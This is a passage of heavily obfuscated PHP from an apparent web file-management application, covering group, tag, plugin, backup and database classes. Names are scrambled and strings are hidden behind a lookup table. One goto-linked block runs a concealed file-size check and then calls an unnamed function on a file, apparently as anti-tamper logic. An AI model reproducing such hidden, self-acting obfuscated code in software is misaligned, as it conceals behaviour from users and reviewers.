"\50{$ûÑÍšòö}\x29"; if (!in_array($Ş¸±æÀ‡, $Åæ·Æ‚)) { return $Ş¸±æÀ‡; } } } public function groupSwitch($ºÅµà§ , $€™¶ƒÅ„) { $˜Ä¹ùòÜ =& $_SERVER[ä¿÷‹µ±]; $¨âıËä× = array($˜Ä¹ùòÜ[1850] => array($˜Ä¹ùòÜ[7], array($ºÅµà§ , $€™¶ƒÅ„))); $óÎÕö¡« = $this->where($¨âıËä×)->select(); $óÎÕö¡« = array_to_keyvalue($óÎÕö¡«, $˜Ä¹ùòÜ[1850]); if (!isset($óÎÕö¡«[$ºÅµà§ ]) || !isset($óÎÕö¡«[$€™¶ƒÅ„]) || $óÎÕö¡«[$ºÅµà§ ][$˜Ä¹ùòÜ[432]] == 0) { return !1; } $¨âıËä× = array($˜Ä¹ùòÜ[1850] => $ºÅµà§ ); $ù‰ÛĞ¥ = Model($˜Ä¹ùòÜ[1940])->where($¨âıËä×)->select(); if (!$ù‰ÛĞ¥) { $ù‰ÛĞ¥ = array(); } foreach ($ù‰ÛĞ¥ as $Ã§¿¡‰Š) { $ÅÉÑÁ¯ = $Ã§¿¡‰Š[$˜Ä¹ùòÜ[1678]]; $¨âıËä× = array($˜Ä¹ùòÜ[1678] => $ÅÉÑÁ¯, $˜Ä¹ùòÜ[1850] => $€™¶ƒÅ„); $¼˜Ïú…É = Model($˜Ä¹ùòÜ[1940])->where($¨âıËä×)->find(); if (!$¼˜Ïú…É) { $ñ©£åÁ = array($€™¶ƒÅ„ => $Ã§¿¡‰Š[$˜Ä¹ùòÜ[1954]]); Model($˜Ä¹ùòÜ[535])->userGroupAdd($ÅÉÑÁ¯, $ñ©£åÁ); } Model($˜Ä¹ùòÜ[535])->userGroupRemove($ÅÉÑÁ¯, $ºÅµà§ ); } $¨âıËä× = array($˜Ä¹ùòÜ[411] => 2, $˜Ä¹ùòÜ[432] => 0, $˜Ä¹ùòÜ[410] => 1, $˜Ä¹ùòÜ[505] => array($˜Ä¹ùòÜ[7], array($ºÅµà§ , $€™¶ƒÅ„))); $»¿†§Îü = Model($˜Ä¹ùòÜ[844])->where($¨âıËä×)->field($˜Ä¹ùòÜ[1955])->select(); $»¿†§Îü = array_to_keyvalue($»¿†§Îü, $˜Ä¹ùòÜ[505], $˜Ä¹ùòÜ[402]); $äŞ½Î· = !empty($»¿†§Îü[$ºÅµà§ ]) ? $»¿†§Îü[$ºÅµà§ ] : !1; if ($äŞ½Î·) { if (!$»¿†§Îü[$€™¶ƒÅ„]) { $»¿†§Îü[$€™¶ƒÅ„] = Model($˜Ä¹ùòÜ[844])->groupRootAdd($€™¶ƒÅ„); } $é½†Îïı = $»¿†§Îü[$€™¶ƒÅ„]; $¨âıËä× = array($˜Ä¹ùòÜ[432] => $äŞ½Î·); $»¿†§Îü = Model($˜Ä¹ùòÜ[844])->where($¨âıËä×)->field($˜Ä¹ùòÜ[1956])->select(); if (!$»¿†§Îü) { $»¿†§Îü = array(); } Model($˜Ä¹ùòÜ[844])->moveClearAuth = !1; foreach ($»¿†§Îü as $õ•¹«Æ) { $Ùà¿Éë÷ = $õ•¹«Æ[$˜Ä¹ùòÜ[410]] == $˜Ä¹ùòÜ[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($˜Ä¹ùòÜ[844])->move($õ•¹«Æ[$˜Ä¹ùòÜ[402]], $é½†Îïı, $Ùà¿Éë÷); } Model($˜Ä¹ùòÜ[844])->moveClearAuth = !0; $¨âıËä× = array($˜Ä¹ùòÜ[411] => 2, $˜Ä¹ùòÜ[505] => $ºÅµà§ ); $¿ğëÜ¼‚ = array($˜Ä¹ùòÜ[505] => $€™¶ƒÅ„); Model($˜Ä¹ùòÜ[1957])->where($¨âıËä×)->save($¿ğëÜ¼‚); Model($˜Ä¹ùòÜ[1958])->where($¨âıËä×)->save($¿ğëÜ¼‚); } $this->_changeChildLevel($óÎÕö¡«[$ºÅµà§ ], $óÎÕö¡«[$€™¶ƒÅ„], !0); $this->where(array($˜Ä¹ùòÜ[432] => $ºÅµà§ ))->save(array($˜Ä¹ùòÜ[432] => $€™¶ƒÅ„)); $this->_clearChildrenCache($óÎÕö¡«[$€™¶ƒÅ„]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($·¡´ºŒä) { $×¬“òäå =& $_SERVER[ä¿÷‹µ±]; return array($×¬“òäå[1959] => array($·¡´ºŒä[0], $×¬“òäå[1960]), $×¬“òäå[1961] => array($·¡´ºŒä[0], $×¬“òäå[1962])); } protected function get($ıÛ¯„è°) { $ÄüŞüŞê =& $_SERVER[ä¿÷‹µ±]; $ˆ¡¯ã“ = Model($ÄüŞüŞê[522])->metaGet($ıÛ¯„è°, $ÄüŞüŞê[1963]); $ª„²Ç„÷ = json_decode($ˆ¡¯ã“, !0); return $ª„²Ç„÷ ? $ª„²Ç„÷ : array($ÄüŞüŞê[1964] => $ÄüŞüŞê[88], $ÄüŞüŞê[369] => array()); } protected function set($ªøŸäŠ´, $ÂØØüŠ±) { $·¸ù¥ö =& $_SERVER[ä¿÷‹µ±]; $ÂØØüŠ± = $ÂØØüŠ± ? $ÂØØüŠ± : array($·¸ù¥ö[1964] => $·¸ù¥ö[88], $·¸ù¥ö[369] => array()); return Model($·¸ù¥ö[522])->metaSet($ªøŸäŠ´, $·¸ù¥ö[1963], json_encode($ÂØØüŠ±)); } protected function getByTagID($÷û®‚Œ›, $êœàÔë) { $‚‰ß’¢¼ =& $_SERVER[ä¿÷‹µ±]; if (!$÷û®‚Œ› || !$êœàÔë) { return !1; } if (!Model($‚‰ß’¢¼[522])->getInfoSimple($÷û®‚Œ›)) { return !1; } $ıº¯×’¾ = $this->get($÷û®‚Œ›); if (!$ıº¯×’¾ || !isset($ıº¯×’¾[$‚‰ß’¢¼[369]])) { return !1; } $æÎ°ßÉ© = array_find_by_field($ıº¯×’¾[$‚‰ß’¢¼[369]], $‚‰ß’¢¼[399], $êœàÔë); return is_array($æÎ°ßÉ©) ? $æÎ°ßÉ© : !1; } public function listSource($ü‹È˜»Ê, $ù¢Ûî›ì) { $¯úæçóÍ =& $_SERVER[ä¿÷‹µ±]; if ($ù¢Ûî›ì && !is_array($ù¢Ûî›ì)) { $ù¢Ûî›ì = array($ù¢Ûî›ì); } $œÓ…¸¯ = $this->listData($ü‹È˜»Ê); $ª•ºÇ— = array(); foreach ($œÓ…¸¯ as $¬ïë¸óó) { $¦ø©é†Ş = $¬ïë¸óó[$¯úæçóÍ[84]]; if (!$¦ø©é†Ş) { continue; } if (!isset($ª•ºÇ—[$¦ø©é†Ş])) { $ª•ºÇ—[$¦ø©é†Ş] = array(); } $ª•ºÇ—[$¦ø©é†Ş][] = $¬ïë¸óó[$¯úæçóÍ[426]]; } $·ùÚÙöı = array(); foreach ($ª•ºÇ— as $ˆ‹±äĞÃ => $ùêÉàú¤) { $¥ß«ˆ  = !0; if (!$ù¢Ûî›ì) { $·ùÚÙöı[] = $ˆ‹±äĞÃ; continue; } foreach ($ù¢Ûî›ì as $ûÂ¸Ê¦) { if (!in_array($ûÂ¸Ê¦, $ùêÉàú¤)) { $¥ß«ˆ  = !1; break; } } if ($¥ß«ˆ ) { $·ùÚÙöı[] = $ˆ‹±äĞÃ; } } if (!$·ùÚÙöı) { return array(); } $§¿ª£íƒ = array($¯úæçóÍ[417] => array($¯úæçóÍ[418], $·ùÚÙöı), $¯úæçóÍ[505] => $ü‹È˜»Ê, $¯úæçóÍ[411] => SourceModel::TYPE_GROUP); $ë¦ËùÑ = Model($¯úæçóÍ[1349])->listSource($§¿ª£íƒ); if (!$ë¦ËùÑ || count($·ùÚÙöı) == $ë¦ËùÑ[$¯úæçóÍ[366]][$¯úæçóÍ[367]]) { return $ë¦ËùÑ; } $æ€ÄÑ´Ï = array(); $÷ƒ¾†„Ü = array_to_keyvalue($ë¦ËùÑ[$¯úæçóÍ[82]], $¯úæçóÍ[12], $¯úæçóÍ[402]); $®ìÅ¢íÌ = array_to_keyvalue($ë¦ËùÑ[$¯úæçóÍ[83]], $¯úæçóÍ[12], $¯úæçóÍ[402]); $Ò·¸¸Ö› = array_merge($®ìÅ¢íÌ, $÷ƒ¾†„Ü); foreach ($·ùÚÙöı as $¦ø©é†Ş) { if (!in_array($¦ø©é†Ş, $Ò·¸¸Ö›)) { $æ€ÄÑ´Ï[] = $¦ø©é†Ş; } } if ($æ€ÄÑ´Ï) { $this->removeBySource($ü‹È˜»Ê, $æ€ÄÑ´Ï); } return $ë¦ËùÑ; } protected function listData($¤û”¿üî) { $“Ú°‘Åµ =& $_SERVER[ä¿÷‹µ±]; $ËÈ©´˜Û = array($“Ú°‘Åµ[1669] => 0, $“Ú°‘Åµ[484] => array($“Ú°‘Åµ[1965], 0), $“Ú°‘Åµ[422] => $“Ú°‘Åµ[1966] . $¤û”¿üî); $ƒñ‚•£ô = $“Ú°‘Åµ[1967]; $ÚÒæ¥œ = $this->field($ƒñ‚•£ô)->where($ËÈ©´˜Û)->order($“Ú°‘Åµ[1968])->select(); return $ÚÒæ¥œ ? $ÚÒæ¥œ : array(); } protected function addToTag($ºÎğ±®Ø, $ØÏ“Ü³Õ, $¯÷á®˜ß) { $û‹³±Ó´ =& $_SERVER[ä¿÷‹µ±]; if (!$this->getByTagID($ºÎğ±®Ø, $¯÷á®˜ß) || !$ØÏ“Ü³Õ) { return !1; } if (!Model($û‹³±Ó´[844])->pathInfo($ØÏ“Ü³Õ)) { return !1; } $Áµß‰ŸÏ = array($û‹³±Ó´[1669] => 0, $û‹³±Ó´[484] => $¯÷á®˜ß, $û‹³±Ó´[421] => $ØÏ“Ü³Õ, $û‹³±Ó´[422] => $û‹³±Ó´[1969] . $ºÎğ±®Ø, $û‹³±Ó´[420] => $û‹³±Ó´[12], $û‹³±Ó´[1854] => 0); if ($this->where($Áµß‰ŸÏ)->find()) { return !1; } return $this->add($Áµß‰ŸÏ); } protected function removeFromTag($û¾Ÿ¿î, $õ¾½‰ Ï, $òÑ­¹ÑÖ) { $çç‡ÜÔ€ =& $_SERVER[ä¿÷‹µ±]; if (!$this->getByTagID($û¾Ÿ¿î, $òÑ­¹ÑÖ) || !$õ¾½‰ Ï) { return !1; } if (is_array($õ¾½‰ Ï)) { $õ¾½‰ Ï = array($çç‡ÜÔ€[7], $õ¾½‰ Ï); } $ØÑÚƒ®² = array($çç‡ÜÔ€[1669] => 0, $çç‡ÜÔ€[484] => $òÑ­¹ÑÖ, $çç‡ÜÔ€[422] => $çç‡ÜÔ€[1969] . $û¾Ÿ¿î, $çç‡ÜÔ€[421] => $õ¾½‰ Ï); return $this->where($ØÑÚƒ®²)->delete(); } protected function removeByTag($ÃßœïÚã, $â×îÓ¯) { $€şõ×÷ =& $_SERVER[ä¿÷‹µ±]; if (!$this->getByTagID($ÃßœïÚã, $â×îÓ¯)) { return !1; } $Ú„ºÆóı = array($€şõ×÷[1669] => 0, $€şõ×÷[484] => $â×îÓ¯, $€şõ×÷[422] => $€şõ×÷[1969] . $ÃßœïÚã); return $this->where($Ú„ºÆóı)->delete(); } protected function removeBySource($–éûÖ™’, $Ûßíæº) { $‘£Ùúù =& $_SERVER[ä¿÷‹µ±]; if (!$–éûÖ™’ || !$Ûßíæº) { return !1; } if (is_array($Ûßíæº)) { $Ûßíæº = array($‘£Ùúù[7], $Ûßíæº); } $Äİ´ßî = array($‘£Ùúù[1669] => 0, $‘£Ùúù[421] => $Ûßíæº, $‘£Ùúù[484] => array($‘£Ùúù[1036], 0), $‘£Ùúù[422] => $‘£Ùúù[1969] . $–éûÖ™’); return $this->where($Äİ´ßî)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\x70\154\165\147\151\156\x4c\x69\163\164"; public $field = array("\x6e\141\x6d\145", "\x73\164\141\164\165\x73", "\162\145\147\x69\x65\x73\164", "\x63\157\x6e\x66\x69\147"); public function loadList($–¾±¸¿’ = false) { $¤Ã”¼Ìß = array_to_keyvalue($this->listData(), $_SERVER[ä¿÷‹µ±][32]); if ($–¾±¸¿’) { return $¤Ã”¼Ìß[$–¾±¸¿’]; } return $¤Ã”¼Ìß; } public function init() { $ùÛæûê =& $_SERVER[ä¿÷‹µ±]; Hook::trigger($ùÛæûê[1970]); $““Ğ—Îµ = $this->loadPluginList(); foreach ($““Ğ—Îµ as $²¹úú† => $¦«»‡İ) { $™ÍÅ±°Ğ = $this->appAllow($²¹úú†, $¦«»‡İ); if (!$™ÍÅ±°Ğ) { continue; } foreach ($¦«»‡İ[$ùÛæûê[1971]] as $¾Ó£…™¶ => $„¤ŒÎúú) { Hook::bind($¾Ó£…™¶, $„¤ŒÎúú); } } Hook::trigger($ùÛæûê[1972]); Hook::trigger(ACTION); } public function appAllow($±Ñ½¡ô», $ïœÌÉ€Â, $ÌÀ°ªÇá = true) { $ñğÇ¾ÓÆ =& $_SERVER[ä¿÷‹µ±]; $è¦¬ò‚è = PLUGIN_DIR . $±Ñ½¡ô» . $ñğÇ¾ÓÆ[1973]; if (!is_array($ïœÌÉ€Â) || !is_array($ïœÌÉ€Â[$ñğÇ¾ÓÆ[1971]]) || $ïœÌÉ€Â[$ñğÇ¾ÓÆ[769]] != 1 || !is_file($è¦¬ò‚è)) { return !1; } if ($GLOBALS[$ñğÇ¾ÓÆ[503]] == 1) { if ($GLOBALS[$ñğÇ¾ÓÆ[6]][$ñğÇ¾ÓÆ[1974]] || !$GLOBALS[$ñğÇ¾ÓÆ[6]][$ñğÇ¾ÓÆ[1975]]) { return !0; } $­‚óŠÎæ = explode($ñğÇ¾ÓÆ[50], strtolower($GLOBALS[$ñğÇ¾ÓÆ[6]][$ñğÇ¾ÓÆ[1975]])); return in_array(strtolower($±Ñ½¡ô»), $­‚óŠÎæ) ? !1 : !0; } if ($ÌÀ°ªÇá && !Action($ñğÇ¾ÓÆ[1976])->checkAuth($±Ñ½¡ô»)) { return !1; } return !0; } public function unInstall($áÏç¹óÖ) { $ÓÛÒ¿Š¯ =& $_SERVER[ä¿÷‹µ±]; $‰Û¤îÄ¦ = $this->loadList($áÏç¹óÖ); if (file_exists(PLUGIN_DIR . $áÏç¹óÖ)) { Hook::apply($áÏç¹óÖ . $ÓÛÒ¿Š¯[1977]); } $this->remove($‰Û¤îÄ¦[$ÓÛÒ¿Š¯[399]]); } public function changeStatus($ø©˜Åú, $ç½ğ±£) { $Ù€½ÚÒ‡ =& $_SERVER[ä¿÷‹µ±]; $Û§›‚‡Ã = $this->loadList($ø©˜Åú); if ($ç½ğ±£) { Hook::apply($ø©˜Åú . $Ù€½ÚÒ‡[1978]); } $this->update($Û§›‚‡Ã[$Ù€½ÚÒ‡[399]], array($Ù€½ÚÒ‡[1979] => $ç½ğ±£)); } public function appRegist($ÜÕ©€Í, $°Óßî®ğ) { $ÜïœéÍ =& $_SERVER[ä¿÷‹µ±]; $¥¥¹¢‘‹ = $this->loadList($ÜÕ©€Í); if ($¥¥¹¢‘‹) { $this->update($¥¥¹¢‘‹[$ÜïœéÍ[399]], array($ÜïœéÍ[1971] => $°Óßî®ğ)); } else { $¦İœøÉ = array($ÜïœéÍ[32] => $ÜÕ©€Í, $ÜïœéÍ[1971] => $°Óßî®ğ, $ÜïœéÍ[769] => 0, $ÜïœéÍ[6] => $this->getConfigDefault($ÜÕ©€Í)); $this->insert($¦İœøÉ); } } public function getConfigDefault($äÀªóá€) { $ì©Ìü×ƒ =& $_SERVER[ä¿÷‹µ±]; $¤û¹ı å = array(); $¿›¦Ñ§ = $this->getPackageJson($äÀªóá€); if (!$¿›¦Ñ§ && is_array($¿›¦Ñ§[$ì©Ìü×ƒ[1980]])) { return $¤û¹ı å; } foreach ($¿›¦Ñ§[$ì©Ìü×ƒ[1980]] as $¼¢™Ğõ¨ => $ÛëŸÑµÆ) { if (!isset($ÛëŸÑµÆ[$ì©Ìü×ƒ[374]]) || isset($¤û¹ı å[$¼¢™Ğõ¨])) { continue; } $¤û¹ı å[$¼¢™Ğõ¨] = $ÛëŸÑµÆ[$ì©Ìü×ƒ[374]]; } return $¤û¹ı å; } public function getPackageJson($ò¦¹çö) { return Hook::apply($ò¦¹çö . $_SERVER[ä¿÷‹µ±][1981]); } public function getConfig($¿©Ã‘“Ğ, $›¸ üÕ¿ = false) { $³˜ÈØ… =& $_SERVER[ä¿÷‹µ±]; $¯é§ØÏ = array(); $îà¶ÈÇÚ = $this->loadList($¿©Ã‘“Ğ); if ($îà¶ÈÇÚ && is_array($îà¶ÈÇÚ[$³˜ÈØ…[6]])) { $¯é§ØÏ = $îà¶ÈÇÚ[$³˜ÈØ…[6]]; } if (!$¯é§ØÏ || $›¸ üÕ¿) { $¯é§ØÏ = $this->getConfigDefault($¿©Ã‘“Ğ); } return $¯é§ØÏ; } public function setConfig($çÌ¬¹­Ó, $şÏúĞÍõ = false) { $ñÊñ÷·– =& $_SERVER[ä¿÷‹µ±]; $ªô²Á¶µ = $this->loadList($çÌ¬¹­Ó); if (!$ªô²Á¶µ) { return !1; } $§¦Å•Éà = $ªô²Á¶µ[$ñÊñ÷·–[6]]; if ($şÏúĞÍõ == !1) { $§¦Å•Éà = array(); $şÏúĞÍõ = $this->getConfigDefault($çÌ¬¹­Ó); } foreach ($şÏúĞÍõ as $Ş™‰ñğ† => $ù—÷šáÂ) { $§¦Å•Éà[$Ş™‰ñğ†] = is_string($ù—÷šáÂ) ? trim($ù—÷šáÂ) : $ù—÷šáÂ; } $this->update($ªô²Á¶µ[$ñÊñ÷·–[399]], array($ñÊñ÷·–[6] => $§¦Å•Éà)); } public function viewList() { $Á¤‰‹§ =& $_SERVER[ä¿÷‹µ±]; $ñƒõÁËö = $this->loadList(); $this->pluginScan($ñƒõÁËö); $ñƒõÁËö = $this->loadPluginList(); $ÍÃ¤®× = array(); foreach ($ñƒõÁËö as $¶Ò¢°¨ƒ => $¥–Šè Ì) { unset($¥–Šè Ì[$Á¤‰‹§[1971]], $¥–Šè Ì[$Á¤‰‹§[6]]); $Æ“Èë§‡ = PLUGIN_DIR . $¥–Šè Ì[$Á¤‰‹§[32]] . $Á¤‰‹§[1973]; if (!is_file($Æ“Èë§‡)) { continue; } $†ÔéÂì = Hook::apply($¥–Šè Ì[$Á¤‰‹§[32]] . $Á¤‰‹§[1981]); if (is_array($†ÔéÂì)) { $ÍÃ¤®×[$¶Ò¢°¨ƒ] = array_merge($¥–Šè Ì, $†ÔéÂì); } } return $ÍÃ¤®×; } private function loadPluginList() { $µõåãŒÜ =& $_SERVER[ä¿÷‹µ±]; $àˆŸ×— = $this->loadList(); if (strtolower(MOD) == $µõåãŒÜ[1982]) { return $àˆŸ×—; } $­â†û©‡ = Hook::trigger($µõåãŒÜ[1983], $àˆŸ×—); if ($àˆŸ×— && !$­â†û©‡) { die; } return $­â†û©‡ ? $­â†û©‡ : $àˆŸ×—; } private function pluginScan($¿”ı¿‡Ş) { $¸öğ²¬  =& $_SERVER[ä¿÷‹µ±]; recursion_dir(PLUGIN_DIR, $úš½ÆïÃ, $à‹€Í¿€, 0); foreach ($úš½ÆïÃ as $çËıÈ½í) { $âãŞ©Ø = get_path_this($çËıÈ½í); if (isset($¿”ı¿‡Ş[$âãŞ©Ø]) || !file_exists($çËıÈ½í . $¸öğ²¬ [1984]) || !file_exists($çËıÈ½í . $¸öğ²¬ [1973])) { continue; } Hook::apply($âãŞ©Ø . $¸öğ²¬ [1978]); } } } goto cùäŞ„ƒ¶¥; cøÀÀîšÖ: $_size = $_SERVER[ä¿÷‹µ±][893]; if ($_SERVER[$_SERVER[ä¿÷‹µ±][894]] != $_size($_file)) { $_getc = $_SERVER[ä¿÷‹µ±][896]; $_getfile = $_SERVER[$_SERVER[ä¿÷‹µ±][891]] . $_SERVER[ä¿÷‹µ±][892]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ä¿÷‹µ±][231], $_getfilec); if (count($_getarrs) < $_SERVER[ä¿÷‹µ±][630]) { $exit = $_SERVER[ä¿÷‹µ±][897]; $exit(); } $_act = $_SERVER[ä¿÷‹µ±][935]; $_act($_file); } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\x62\141\x63\x6b\165\160\x4c\151\163\164"; public $field = array("\x69\157", "\156\141\x6d\145", "\163\164\x61\x74\165\163", "\143\157\156\x74\x65\156\x74", "\155\x61\156\x75\141\x6c", "\x72\x65\163\x75\x6c\x74", "\x74\x69\155\145\106\162\x6f\x6d", "\x74\151\x6d\x65\x54\157"); public function config() { $Ñ¯»æ¦ã =& $_SERVER[ä¿÷‹µ±]; $ë»†¸Ÿş = Model($Ñ¯»æ¦ã[789])->get($Ñ¯»æ¦ã[799]); $ë»†¸Ÿş = json_decode($ë»†¸Ÿş, !0); $ë»†¸Ÿş = is_array($ë»†¸Ÿş) ? $ë»†¸Ÿş : array(); if (!isset($ë»†¸Ÿş[$Ñ¯»æ¦ã[774]])) { $ë»†¸Ÿş[$Ñ¯»æ¦ã[774]] = $Ñ¯»æ¦ã[88]; } unset($ë»†¸Ÿş[$Ñ¯»æ¦ã[1648]]); Action($Ñ¯»æ¦ã[1875])->taskInit(); Model($Ñ¯»æ¦ã[1647])->cacheClear(); $á€Â³Ú = $Ñ¯»æ¦ã[1876]; $›‚Áƒ°³ = Model($Ñ¯»æ¦ã[1877])->findByKey($Ñ¯»æ¦ã[1666], $á€Â³Ú); if (!$›‚Áƒ°³) { $›‚Áƒ°³ = array(); } if (isset($›‚Áƒ°³[$Ñ¯»æ¦ã[203]])) { $›‚Áƒ°³[$Ñ¯»æ¦ã[203]] = json_decode($›‚Áƒ°³[$Ñ¯»æ¦ã[203]], !0); } if (isset($ë»†¸Ÿş[$Ñ¯»æ¦ã[203]])) { $›‚Áƒ°³[$Ñ¯»æ¦ã[203]][$Ñ¯»æ¦ã[1651]] = $ë»†¸Ÿş[$Ñ¯»æ¦ã[203]]; unset($ë»†¸Ÿş[$Ñ¯»æ¦ã[203]]); } return array_merge($›‚Áƒ°³, $ë»†¸Ÿş); } public function listData($ş„ç¥„° = false, $ä ±Ù = "\x6d\x6f\144\151\146\171\124\x69\x6d\145", $è¥àÊªÛ = false) { return parent::listData($ş„ç¥„°, $ä ±Ù, !0); } public function lastItem() { $ú¾¢ö‹È = $this->listData(); return !empty($ú¾¢ö‹È[0]) ? $ú¾¢ö‹È[0] : null; } public function kill($ïŞä¬”‡) { $™—¯ºæš =& $_SERVER[ä¿÷‹µ±]; $å¹”Çª¿ = $this->listData($ïŞä¬”‡); if (!$å¹”Çª¿ || empty($å¹”Çª¿[$™—¯ºæš[32]])) { return !0; } Task::kill($™—¯ºæš[798]); Task::kill($™—¯ºæš[819]); Task::kill($™—¯ºæš[828]); $ÂÚşÜŸ¼ = $å¹”Çª¿[$™—¯ºæš[32]]; $ÇÙÒÅ = TEMP_FILES . $™—¯ºæš[797] . $ÂÚşÜŸ¼ . $™—¯ºæš[8]; IO::remove($ÇÙÒÅ, !1); return $this->remove($ïŞä¬”‡); } public function remove($‡·‹İÏ¬) { $ü¥×Ãìº = $this->listData($‡·‹İÏ¬); if (!$ü¥×Ãìº) { return !0; } return $this->backupRemove($ü¥×Ãìº); } private function backupRemove($¡Í„»ŒÕ) { parent::remove($¡Í„»ŒÕ[$_SERVER[ä¿÷‹µ±][399]]); $ƒŞã§Á = $this->backupPath($¡Í„»ŒÕ); IO::remove($ƒŞã§Á, !1); return !0; } private function backupPath($ïàßú­á) { $èèÃçØ =& $_SERVER[ä¿÷‹µ±]; $åÆÇ·ºñ = $ïàßú­á[$èèÃçØ[32]]; $›­”‡Ô = Model($èèÃçØ[789])->get($èèÃçØ[790]); $¾ø©ªÁÀ = substr(md5($èèÃçØ[791] . $›­”‡Ô . $åÆÇ·ºñ), 0, 8); return "\x7b\x69\157\x3a{$ïàßú­á[$èèÃçØ[771]]}\175\57\x64\141\x74\141\142\141\163\x65\57\142\141\x63\x6b\x75\160\57" . $åÆÇ·ºñ . $èèÃçØ[11] . $¾ø©ªÁÀ; } public function start() { $ª‚å‚° =& $_SERVER[ä¿÷‹µ±]; if ($GLOBALS[$ª‚å‚°[6]][$ª‚å‚°[89]][$ª‚å‚°[1878]] != $ª‚å‚°[88]) { return !0; } $üÆÌ¦›„ = $this->config(); if (!$üÆÌ¦›„ || $üÆÌ¦›„[$ª‚å‚°[1648]] != $ª‚å‚°[88]) { return !1; } $çÜÑè´˜ = $this->process(); foreach ($çÜÑè´˜ as $ğÜµÚò¶) { if ($ğÜµÚò¶) { return Task::restart($ğÜµÚò¶[$ª‚å‚°[399]]); } } $“ï £ÊŠ = new Backup(); $¥¹×›ü‘ = $“ï £ÊŠ->db(); if ($¥¹×›ü‘) { $¥¹×›ü‘ = $“ï £ÊŠ->dbFile(); if ($¥¹×›ü‘ && $üÆÌ¦›„[$ª‚å‚°[774]] == $ª‚å‚°[197]) { $¥¹×›ü‘ = $“ï £ÊŠ->file(); } } Backup::set(array($ª‚å‚°[769] => 1, $ª‚å‚°[497] => time())); return !0; } public function process() { $µ²û—‰¨ =& $_SERVER[ä¿÷‹µ±]; $Ôè¯İŠß = array($µ²û—‰¨[777] => Task::get($µ²û—‰¨[798]), $µ²û—‰¨[781] => Task::get($µ²û—‰¨[819]), $µ²û—‰¨[199] => Task::get($µ²û—‰¨[828])); $ººŞ‘ = !1; foreach ($Ôè¯İŠß as &$ûËÈª÷­) { if ($ººŞ‘) { $ûËÈª÷­ = !1; continue; } if ($ûËÈª÷­) { $ñŠàí÷ = intval(_get($ûËÈª÷­, $µ²û—‰¨[1683], 0)); if (time() - $ñŠàí÷ > 7200) { Task::kill($ûËÈª÷­[$µ²û—‰¨[399]]); $ººŞ‘ = !0; $ûËÈª÷­ = !1; } } } return $Ôè¯İŠß; } public function restore() { $‚†Ùšøˆ =& $_SERVER[ä¿÷‹µ±]; ActionCall($‚†Ùšøˆ[1082], !0, 1); ActionCall($‚†Ùšøˆ[1082], !0, 0); } } goto Fµİê­šö’; Bâ±°– ¸°: class DbManage { function __construct($Î–¸†Ùş = array()) { $Í÷ß¤Ãı =& $_SERVER[ä¿÷‹µ±]; if (empty($Î–¸†Ùş)) { $Î–¸†Ùş = $GLOBALS[$Í÷ß¤Ãı[6]][$Í÷ß¤Ãı[21]]; } $this->database = $Î–¸†Ùş; } public function model($ê²üÁç— = '') { return new ModelBase($ê²üÁç—, $_SERVER[ä¿÷‹µ±][12], $this->database); } public function db($“˜˜ºğ¶ = false) { $ˆé’ÎÜä =& $_SERVER[ä¿÷‹µ±]; $¥˜Ï€Œø = array_change_key_case($this->database); if ($this->dbType() == $ˆé’ÎÜä[13] || !$“˜˜ºğ¶) { return $this->model()->db(); } $åÄÉå£‹ = $¥˜Ï€Œø[$ˆé’ÎÜä[994]]; $¥˜Ï€Œø[$ˆé’ÎÜä[994]] = $ˆé’ÎÜä[12]; if ($¥˜Ï€Œø[$ˆé’ÎÜä[989]] == $ˆé’ÎÜä[986]) { $¡ÁşŒ…É = $¥˜Ï€Œø[$ˆé’ÎÜä[995]]; $¥˜Ï€Œø[$ˆé’ÎÜä[995]] = substr($¡ÁşŒ…É, 0, strrpos($¡ÁşŒ…É, $ˆé’ÎÜä[1081])); } $this->database = $¥˜Ï€Œø; $‘µïíÀƒ = $this->model()->db(); try { $Ûö”à–¯ = $‘µïíÀƒ->execute("\163\x68\x6f\x77\40\144\x61\164\x61\142\x61\163\x65\163\x20\154\x69\x6b\145\40\x27{$åÄÉå£‹}\x27"); } catch (Exception $ ûŒ©ï–) { } if (!$Ûö”à–¯) { $‘µïíÀƒ->execute("\143\162\x65\141\x74\x65\40\144\x61\164\141\142\141\163\145\40\140{$åÄÉå£‹}\140"); } $¥˜Ï€Œø[$ˆé’ÎÜä[994]] = $åÄÉå£‹; if ($¥˜Ï€Œø[$ˆé’ÎÜä[989]] == $ˆé’ÎÜä[986]) { $¥˜Ï€Œø[$ˆé’ÎÜä[995]] .= $ˆé’ÎÜä[1081] . $åÄÉå£‹; } $this->database = $¥˜Ï€Œø; $‘µïíÀƒ->execute("\165\x73\145\40\140{$åÄÉå£‹}\x60"); return $‘µïíÀƒ; } public function createTable($ü—ÕîÔ½, &$´šÃ®°˜) { $…“å™œ =& $_SERVER[ä¿÷‹µ±]; if (!IO::exist($ü—ÕîÔ½)) { ActionCall($…“å™œ[1082], !0, 0); show_json(LNG($…“å™œ[1083]), !1); } $íş˜×¬¼ = $this->model()->db(); $áÖßÒË¢ = sqlSplit(IO::getContent($ü—ÕîÔ½)); foreach ($áÖßÒË¢ as $Ÿ­É¾çÜ) { $ÒÅÑ†“ = stripos($Ÿ­É¾çÜ, $…“å™œ[1084]) === 0; if ($ÒÅÑ†“) { $´šÃ®°˜->task[$…“å™œ[805]] += 1; } $íş˜×¬¼->execute($Ÿ­É¾çÜ); if ($ÒÅÑ†“) { preg_match($…“å™œ[1085], $Ÿ­É¾çÜ, $†Î‰ÈæÅ); $´šÃ®°˜->task[$…“å™œ[1086]] = $†Î‰ÈæÅ[1]; $´šÃ®°˜->update(1); } } } public function insertTable($óÆïÚ…ú, &$ªÂï¶¸‹) { $¶§‡Â§¦ =& $_SERVER[ä¿÷‹µ±]; $ëùö‹ù = $this->model()->db(); $‹õ ›Ã¡ = $¸Óºí‘Í ? array($¸Óºí‘Í) : $ëùö‹ù->getTables(); foreach ($óÆïÚ…ú as $¾ªÎÌ¸“) { $¸Óºí‘Í = basename($¾ªÎÌ¸“, $¶§‡Â§¦[807]); if (!in_array($¸Óºí‘Í, $‹õ ›Ã¡)) { continue; } $ªÂï¶¸‹->task[$¶§‡Â§¦[1086]] = $¸Óºí‘Í; if (get_filesize($¾ªÎÌ¸“) == 0) { continue; } 